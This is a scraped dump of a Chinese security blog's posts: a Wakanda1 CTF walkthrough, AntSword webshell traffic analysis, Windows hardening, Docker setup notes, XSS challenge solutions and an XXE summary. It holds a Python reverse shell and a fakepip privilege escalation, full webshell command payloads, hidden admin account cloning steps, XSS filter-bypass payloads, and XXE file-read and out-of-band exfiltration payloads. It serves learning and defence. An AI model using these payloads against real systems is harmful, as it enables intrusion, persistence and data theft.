4096 Jan 16 22:18 .X11-unixdrwxrwxrwt 2 root root 4096 Jan 16 22:18 .XIM-unix 可以看到test是由devops创建的，时间明显晚于其他文件，猜测有程序定期生成test文件（？），在/srv下找到了这个文件（？），.antivirus.py。 12345678910ls /srv -latotal 12drwxr-xr-x 2 root root 4096 Aug 1 2018 .drwxr-xr-x 22 root root 4096 Aug 1 2018 ..-rw-r--rw- 1 devops developer 36 Aug 1 2018 .antivirus.pycat /srv/.antivirus.pyopen('/tmp/test','w').write('test') 这个文件所有人都可以修改，可以修改内容反弹shell。在文件后加入内容 12345678import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;192.168.1.101&quot;,1235))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]) 在攻击机上监听1235端口 1nc -lvvp 1235 等了一会得到了devpos的shell，可以读到flag2了。 提权查看devops的权限 12345678sudo -lsudo -lMatching Defaults entries for devops on Wakanda1: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser devops may run the following commands on Wakanda1: (ALL) NOPASSWD: /usr/bin/pip 无密码只能运行pip，可以利用fakepip提权，其实只要利用phpstudy就行。 下载好setup.py，把LHOST改为kali的ip，放到phpstudy网站根目录，在kali上监听端口，然后在windows上下载setup.py并利用fakepip反弹shell即可。 1root@k:~$ nc -lvvp 13372 12devops@wakanda1:~$ wget http://192.168.1.3/setup.pydevops@wakanda1:~$ sudo /usr/bin/pip install . --upgrade --force-reinstall 在kali上会收到root的shell，第三个flag在/root/root.txt 参考文章：FreeBuf文章","link":"/2020/01/17/wakanda1/"},{"title":"AntSword 修改","text":"AntSword 蚁剑 AntSwordAntSword - Github 版本号 2.11.1.1 在被植入 Webshell 的靶机上安装 Wireshark，过滤器 http and ip.addr == 192.168.2.1，Webshell 为 &lt;?php eval($_POST['c']); ?&gt; default 编码器测试连接1c=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%22152b%22.%22b4e13%22%3Becho%20%40asenc(%24output)%3Becho%20%224077a%22.%2272009%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B URL 解码 123456789101112131415161718192021222324252627282930313233@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo &quot;152b&quot;.&quot;b4e13&quot;;echo @asenc($output);echo &quot;4077a&quot;.&quot;72009&quot;;}ob_start();try{$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;) $D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;{$D} &quot;;if(substr($D,0,1)!=&quot;/&quot;){foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L) if(is_dir(&quot;{$L}:&quot;)) $R.=&quot;{$L}:&quot;; } else {$R.=&quot;/&quot;;}$R.=&quot; &quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot; {$s}&quot;;echo $R;;}catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die(); 返回 1152bb4e13/var/www/html / Linux ubuntu 5.8.0-49-generic #55~20.04.1-Ubuntu SMP Fri Mar 26 01:01:07 UTC 2021 x86_64 www-data4077a72009 查看文件URL 解码后再对第二个参数的第三位开始 base64 解码，第三位开始是从 try 代码块得到的 12345678910111213c=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo &quot;85290&quot;.&quot;397460&quot;;echo @asenc($output);echo &quot;03dbf&quot;.&quot;32257&quot;;}ob_start();try{$F=base64_decode(substr($_POST[&quot;c9c22403ae1dda&quot;],2));$P=@fopen($F,&quot;r&quot;);echo(@fread($P,filesize($F)?filesize($F):4096));@fclose($P);;}catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die();&amp;c9c22403ae1dda=RH/var/www/html/index.php 返回 123485290397460&lt;?phpeval($_POST['c']);?&gt;03dbf32257 虚拟终端执行命令URL 解码后，base64 解码同上 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102c=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out){return $out;};function asoutput({$output=ob_get_contents();ob_end_clean();echo &quot;afd8&quot;.&quot;20e2&quot;;echo @asenc($output);echo &quot;58faf&quot;.&quot;24032&quot;;}ob_start();try{$p=base64_decode(substr($_POST[&quot;rfc498b2155762&quot;],2));$s=base64_decode(substr($_POST[&quot;vee0d1a6734246&quot;],2));$envstr=@base64_decode(substr($_POST[&quot;sf65ed2161f0f8&quot;],2));$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;{$s}\\&quot;&quot;:&quot;/c \\&quot;{$s}\\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;){@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);}else{@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);}if(!empty($envstr)){$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) {if (!empty($v)){@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));}}}$r=&quot;{$p} {$c}&quot;;function fe($f){$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe('putenv') &amp;&amp; (fe('error_log') || fe('mail'))) {if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv(&quot;PHP_LOL=() { x; };$c &gt;$tmp 2&gt;&amp;1&quot;);if (fe('error_log')) {error_log(&quot;a&quot;, 1);}else {mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);}}else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join(&quot;&quot;,$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;)){$w=new COM('WScript.shell');$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);print ($ret!=0)?&quot;ret={$ret}&quot;:&quot;&quot;;;}catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die();&amp;rfc498b2155762=T0/bin/sh&amp;sf65ed2161f0f8=Mh&amp;vee0d1a6734246=75cd &quot;/var/www/html&quot;;whoami;echo [S];pwd;echo [E] 返回 12345afd820e2www-data[S]/var/www/html[E]58faf24032 www-data 是终端显示的用户名，/var/www/html是终端的输出，[S] [E]是分隔符 流量分析通过以上常用功能，可以看出蚁剑的流量特征： asenc 应该是在修改编码器时会改变的函数，但是本身就是一个特征 asoutput 使用缓冲区输出最后的结果 将功能与参数分离，比如读取文件就会将读取文件的命令和希望读取的文件分别用两个参数传输，执行命令同理。参数名为随机的字母数字，参数值从第三位开始到最后可被 base64 解密 返回的内容基本就是希望的到的输出和随机字母数字组成的分隔符，这个随机字母数字的分隔符在请求中会出现 其他默认编码器使用了 rot13 编码器（比较容易直接看懂），测试连接的请求： 1c=%40eval(%40str_rot13(%24_POST%5B'o9786c5eeb847b'%5D))%3B&amp;o9786c5eeb847b=... 与原来的区别几乎没有 返回： 1ea09c133/ine/jjj/ugzy / Yvahk hohagh 5.8.0-49-trarevp #55~20.04.1-Hohagh FZC Sev Zne 26 01:01:07 HGP 2021 k86_64 jjj-qngn12467f5 其他的几种默认解码器也类似，流量特征基本不变 PHP RSA 编码器使用需要服务器开启 openssl 扩展 在 Antsword -&gt; 编码管理 -&gt; 编码管理 -&gt; 新建编码器，选择 PHP RSA 新建一个编码器。在右侧 RSA 配置中生成密钥对，并复制下方的 shell 使用。 请求： 1c=IMoF3ctOxVOR6p19%2BxwExu%2Bol3BMZg4HSG0uVL1JaAePP%2F6FCMV7OVvp21xEQqldZEP4VZQ11nh2SV3xGpcUuDTUf3ieb4uQS9bNQQ07UJA%2BGF9Ug5jvz1eLqZcszbvmm2aCetXM5k1G0pvlPXDLmS1bEOwdArUXOFPZPh%2FKI%2F4%3D%7CC5uxFWclgK4pD5VA89%2BFQyWsToxiosAtgvVY0u6zT1W3jfsQ90V02NsswJfc3amoH6Y9cvN6D0%2FNUFTegqOiSzuQLNVxoduj%2B3KNjQeZ1IrhDnXQ4Fo1FkLm4lX4moIVR52SNUarHAbIcKybQ%2B4dG1DFt%2FkLUGBcihKqASDCKok%3D%7CMC2QmR3DuBapBOrh%2B1AKQThcZbYi8uTQls1ysD4dyVOttzYkq1FCBdHsn9PXtp%2BgkXYiQsuqXTVemXchyLF5W6NNolLww334TJFog4ytMl564XjraWbLD9JajAgzqd3JfFyrsdnzQClKVNyCChxw%2BAC8GhrtnrvFGzaIwzZ4VKg%3D%7CWDcrKe%2FcGgiHVF%2BGn3o3oc0a3q367xNsuf7xveK73jbIljneg%2FgBzvRtrSwX%2Fdk5WrMdgoCbZ8pquTn4kdpOoei63iziYYnVyBZI8yJo4FpQ2qnsXnNh3djOuGodlXuJ3zWwLSB25CQlcjmjJydmnTJruNMu7jQ0mFrGnitkZG0%3D%7CpmnLN%2FslQqxNls6vQCoX1a%2BBjcFsTtYy%2F1LW%2BEfi7FQuYWGtyg0s%2B2AoiXgEEvih7wnuuR%2FG2fdPRcs%2F4NsqzqsjmWPqJhXXNIvEip1a%2FEAvDDk2ErQsYRk2BZP79odetrM%2BaoY5229lfPJy77KIgIGAOx9aVriZkjGmnMH2dAA%3D%7Cb8Lb8K8Is%2FqeRSIKJ9JHwgU%2BPyLdwMuL%2FNUhGcPNlmXCMFjGnZOCrx3la2zqot6vIv6gsVjeihU8WtI66ZTQGv6JgSuYzT%2BB%2Bc7G1DxpNQ3UjDyswTpzXTfvkrSbEzAanO3DXe4x5ng3Qxo963TY5xnhhaQK3N2r6HAGulODsZs%3D%7CQpYB6t6FPktKIbWbIM5%2Fk8TYYMAS4SEjnwOcl1vtZMXhr%2BzHTfwg7Yy47Xu7iIy0Rr4c%2FSjHAIhd0IO4f6%2FmGmovGu4%2FwWCQM%2FNKgZ4TgiGY2skR8R5JJyxDa%2FQNgZNJzxjTKDc%2BVDQo0He7GufuFWjOSvdNTUXlcDSlshPHZn4%3D%7CJT4GMz3U3aTokpmglcAKmQARMg5NBC0lja5CHhNIli928BV6sWT0W3GXjoY6wcBLrO9HtLndUFxeHolR85Tmn1OT4AYFhooIj8hYPBS6pa9Z0w%2FV6KlHfFOyvyU85gQWd2%2FtCaT6q26Q6G9hYRleFHxTrL%2B57jvIH%2B5j6H5nHZw%3D%7CVYVbGSTZziAiVfOvNcFLT0X53WbN0i1CzNSnhFl7kJcwphMIsC83dkkYApGo5FyNjnMwpXuYO1DPigqtUOBSBH7QkzW3cP1MDavxvXcfQXrK6HtXDyinXtDNsor1YWpJA5VcKyjinrgbGvQL3wpGYLTR5kHCmMXtt8tkTwJYMBU%3 在流量上可以看出已经是完全的二进制流了，缺点在于使用 RSA 编码器需要服务器端开启 openssl 扩展，而且上传 shell 时有明显的BEGIN PUBLIC KEY 和 END PUBLIC KEY。此外，蚁剑没有提供默认的 RSA 解码器，需要自己编写。 之后发现，在进行命令执行或虚拟终端时，会有其他参数（上面提到过），这些参数没有经过编码器，还是截断后的 base64，可能被识别。 自定义编码器蚁剑的编码器和解码器在antData/encoders目录下，实现解码器只需实现相应文件内的module.exports函数即可。 编码器中蚁剑发送的 HTTP 请求为 data 这个数组的内容。data 的键为参数名，值为参数值。data['_']存放原始 payload，处理完成后要删除这个元素 ，否则会发送原始 payload。处理完成后 return data 数组即可。 解码器类似 实现一个编码器待续","link":"/2021/04/10/webshell/"},{"title":"Windows 服务器安全","text":"Windows 安全架构安全配置账号安全策略设置用户账户用户账户分为本地和全局两种，全局用户可在网络上任意计算机上登录。 Windows 常用内置账户有 Guest（低权限） 和 Administrator（高权限），可以改名，不能删除。 组用于简化系统管理，通过组可以一次性位一批用户设置权限。 内置组账号：Administrators, Users, Guests, Backup Operators, Replicator, * Operators(Print Account, Server), Domain *(Administrators, Users, Guests), Network, Interactive, Everyone 组分为本地组，全剧组和特殊组。全剧组分为三类，管理员组(Domain Admins)，用户组(Domain Users)，访客组(Domain Guests)。特别组不能通过用户管理器增加新成员，也不能被浏览和修改，有 System(操作系统), Creator owner(创建对对象拥有所有权的用户), Interactive(以交互方式在本地系统登录入网的所有哦用户), Network(系统中通过网络连接的所有用户), Everyone(登录上网的系统中的所有用户，相当于Interactive+Network，所有登陆账户都是Everyone组的成员)。 账户安全管理对于用户账户，应设置尽量小的权限。对于系统管理员，应妥善管理和设置口令。 应把性质相同的用户分在同一组，便于管理。 账号克隆和SIDSID，安全标识符，唯一标识用户、组和计算机账户。Windows系统使用SID区分用户。 通过对注册表的 HKEY_LOCAL_MACHIENE\\SAM\\SAM\\Domains\\Account\\Users\\ 下的子健操作可以克隆账户（需要System权限），可以使一个普通用户拥有与Administrator同样的权限。 账号克隆过程：打开CMD输入 net user beifeng$ 123 /add，$可以隐藏用户。这个用户在cmd的net user里看不到，但是可以在计算机管理中看到。进入注册表 HKEY_LOCAL_MACHIENE\\SAM\\SAM\\Domains\\account\\user\\names\\beifeng$。将项beifeng$、上层目录中与beifeng$对应的000003f1、与Administrator对应的000001f4导出为.reg，打开两个reg文件，将Administrator用户对应的000001f4下的键F的值复制，覆盖beifeng$对应的项000003f1下的F的值。删除beifeng$用户（net user beifeng$ /del），再把beifeng$.reg和000003f1.reg导入，设置密码（net user beifeng$ 123），完成克隆。 入侵者克隆时一般选择已有的账号进行克隆，比如aspnet, guest等，通过本地管理员检查工具枚举账户可以发现 这样的克隆管理员。 账号枚举Windows默认允许任何用户通过空用户得到系统所有账号和共享列表，得到用户名后暴力破解密码可以进行登录。 防止方式：控制面板，管理工具，本地安全策略选项，Windows设置，安全设置，本地策略，安全选项。将网络访问，不允许SAM账户的匿名枚举和网络访问，不允许SAM和共享的匿名枚举启用。 其他设置 Administrator账户更名。 不显示上次登陆过的用户名。控制面板，管理工具，本地安全策略，本地策略，安全选项。启用登陆屏幕上不要显示上次登录过的用户名。 强制Windows口令的复杂性。本地计算机策略，计算机配置，Windows设置，安全设置，账户策略，密码策略。 检查组和账号。我的电脑，管理，计算机管理，本地用户与组。或者通过cmd的net user命令。","link":"/2020/02/26/windows-security/"},{"title":"Windows server 配置","text":"Docker安装 Docker管理员 Powershell 执行 12Install-Module -Name DockerMsftProvider -Repository PSGallery -ForceInstall-Package -Name docker -ProviderName DockerMsftProvider 提示信任，输入 A 下载不成功可以到以下地址手动下载 1https://dockermsft.blob.core.windows.net/dockercontainer/docker-19-03-1.zip 下载完成后复制到C:\\Users\\Administrator\\AppData\\Local\\Temp\\2\\DockerMsftProvider\\下，执行 12C:\\Users\\Administrator\\AppData\\Local\\Temp\\2\\DockerMsftProvider\\Docker-19-03-1.zip -Algorithm SHA256 Install-Package -Name docker -ProviderName DockerMsftProvider -Verbose 完成后重启 daemon.json 位置：C:\\ProgramData\\Docker\\config\\daemon.json 重启 docker 服务 12net stop dockernet start docker 安装 docker-compose在安装 docker 的前提下，到 https://github.com/docker/compose/releases下载最新 的 docker-compose，复制到 docker 的安装目录下即可。","link":"/2020/06/15/windows-server/"},{"title":"Windows中WSL的位置","text":"1C:\\Users\\[user]\\AppData\\Local\\Packages\\KaliLinux.54290C8133FEE_ey8k8hqnwqnmg\\LocalState\\rootfs","link":"/2019/11/27/wslposition/"},{"title":"XSS 总结","text":"XSS（Cross Site Script），跨站脚本攻击 XSS总结Docker 快速搭建 XSS PlatformGithub - XSS Platform 中作者给出了使用 Docker 搭建的方式，文章，做一下记录。 安装 MySQL 1docker run --name mysql5.6 -e MYSQL_ROOT_PASSWORD=********* -d -i -p 33006:3306 mysql:5.6 安装 XSS Platform 1docker run --name xssplatform --link mysql5.6:db -d -i -p 8888:80 daxia/websafe:latest 修改 hosts 1vim /etc/hosts 添加一条记录 1127.0.0.1 xss.localhost 启动 php 和 nginx 服务 1docker exec xssplatform zsh -c &quot;php /root/start.php&quot; 访问http://xss.localhost:8888/打开安装页面，因为已经把 mysql 容器链接到了 xssplatform 容器，数据库地址直接填写 db 即可。 XSS闯关小游戏level 2搜索框中闭合 value 属性和 input 标签 1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; level 3上一个方法不管用，过滤了尖括号，单引号闭合属性后用事件弹窗，注释掉后面的内容 1' onclick=alert(1)// level 4和上一个差不多，用双引号闭合 1&quot; onclick=alert(1)// level 5过滤了 script 和 on ，可以用 a 标签 1&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; level 6还是过滤了 on 和 script href，但是可以用大小写绕过 1&quot; oNclick=alert(1)// level 7过滤差不多，这次会替换为空并且检测大小写，双写绕过 1&quot; oonNclick=alert(1)// level 8友情链接直接提供了一个 a href，但是没法直接使用javascript:alert(1)，应该是过滤了 script，用 html 实体编码绕过 1&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41; level 9会检测 http 协议，过滤 script，把 http 放在注释中，用%09绕过过滤 1javascr%09ipt:alert(1)//http:// level 10存在隐藏的 form 表单，其中 t_sort可以注入 1?keyword=well done!&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(1) level 11隐藏的 form 表单，有一个 t_ref，应该是referer。抓包改一下 1&quot; type=&quot;text&quot; onclick=&quot;alert(1) level 12差不多，这次是 user-agent 1&quot; type=&quot;text&quot; onclick=&quot;alert(1) level 13cookie 1&quot; type=&quot;text&quot; onclick=&quot;alert(1) level 14exif XSS，用含有payload的图片触发，没法复现 level 15Angular5 ng-include 指令，ng-include 用于包含外部 HTML 文件，包含的内容作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。 1/level15.php?src='level1.php?name=test&lt;img src=1 onerror=alert(1)&gt;' level 16过滤了空格、script、/，使用%0d，%0a作为分隔符。 1?keyword=&lt;img%0asrc=x%0donError=alert('xss')&gt; level 171?arg01=a&amp;arg02= onmouseover=alert(1) level 181?arg01=a&amp;arg02=b onmouseout=alert(1) level 19Flash XSS，以后学习 1?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt; level 20同上 1?arg01=id&amp;arg02=\\%22))}catch(e){}if(!self.a)self.a=!alert(1)//%26width%26height CheetSheetOWASP XSS Filter Evasion Cheetsheet Github","link":"/2020/05/13/xss/"},{"title":"XXE 总结","text":"XXE 总结 XML分为几个主要部分，HTML 可以看作是 XML 的一种 1234567891011121314151617&lt;!--XML申明--&gt;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt; DTDXML 的格式规范由 DTD 定义，类似 1234567&lt;?xml version=&quot;1.0&quot;&gt; &lt;!DOCTYPE message [&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;&lt;!ELEMENT receiver (#PCDATA)&gt;&lt;!ELEMENT sender (#PCDATA)&gt;&lt;!ELEMENT header (#PCDATA)&gt;&lt;!ELEMENT msg (#PCDATA)&gt; 这个 DTD 定义了根元素是 message，message 下面有4个子元素，还定义了子元素类型。 DTD 声明DTD 可以在内部声明，也可以从外部引用 123&lt;!DOCTYPE rootelement [declaration]&gt;或&lt;!DOCTYPE rootelement STSTEM &quot;file&quot;&gt; 关键字 DOCTYPE：DTD 的声明 ENTITY：实体的声明 SYSTEM、PUBLIC：外部资源申请 实体类似于变量，在 DTD 中定义，可以在文档中其他位置引用，可根据在文档内部定义或从外部引用定义分为内部实体和外部实体 123456789外部实体：&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt; 也可以引用公用 DTD 定义外部实体 1&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt; 也可分为通用实体和参数实体，通用实体在 DTD 中定义，在 XML 文档中使用&amp;引用，参数实体使用% name在 DTD 中定义，只能在 DTO 中使用%引用 123&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; %an-element; %remote-dtd; URI 中可使用的协议类型 libxml2 PHP Java .NET file file http file http http https http ftp ftp ftp https php file ftp compress.zlib jar compress.bzip2 netdoc data mailto glob gopher phar PHP 在开启相应扩展后还能支持更多协议类型（最好的语言 Extension Scheme openssl https、ftps zip zip ssh2 ssh2.shell、ssh2.exec、ssh2.tunnel、ssh2.sftp、ssh2.scp rar rar ogg oggvorbis expect expect XXE12345678&lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents('php://input'); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); echo $creds;?&gt; 读取文件payload 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt; 如果内容包含带有 XML 语义的字符，会导致解析失败，可以进行转义，比如使用 base64 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE xxe[&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=conver.base64-encode/resouce=index.php&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 或是使用&lt;![CDATA[xxx]]&gt;，其中xxx内容被转义，不会解析，但是只能在 DTO 中拼接，并在 XML 中调用 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; evil.dtd 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; 命令执行1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe[&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;expect://whoami&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 需要 expect 扩展 Blind XXE实际是外带 服务端 index.php 123456&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?&gt; test.dtd 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999?p=%file;'&gt;&quot;&gt; payload 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt; 过程： 首先调用 %remote，服务器引入http://ip/test.dtd，然后调用 %int，调用 test.dtd 中的%file，获取敏感文件并放在参数 p 的位置，最后调用%send，将结果发送到远程。 可以发现利用 XXE 可以实现 SSRF。可以参考上面 URI 中可使用的协议类型。 也可使用jar:进行文件上传 1jar:http://host/app.jar!/file/in/zip ! 表示解压其中的文件，请求到文件后，会把它保存到临时文件，提取出指定文件，最后删除临时文件。 漏洞探测在请求头 Content-Type 添加text/xml或application/xml，并添加 payload 123456789101112131415161718192021222324252627282930313233#任意文件读取(有回显)&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY % xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;#无回显的情况，使用外带数据通道提取数据，先用 file:// 或 php://filter 获取目标文件的内容，然后将内容以 http 请求发送到接收数据的服务器（攻击服务器）：&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;#evil.dtd的内容：(内部的 % 号要进行实体编码成 %)&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM 'http://ip:9999?p=%file;'&gt;&quot;&gt;#最后用nc进行本地监听nc -lvv 9999#命令执行 ( PHP 要开启 PECL 上的 Expect 扩展）&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM &quot;expect://whoami&quot;&gt;]&gt;#测试后端服务器的开放端口 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY portscan SYSTEM &quot;http://192.168.1.5:3389&quot;&gt;]&gt;#通过返回的 “Connection refused” 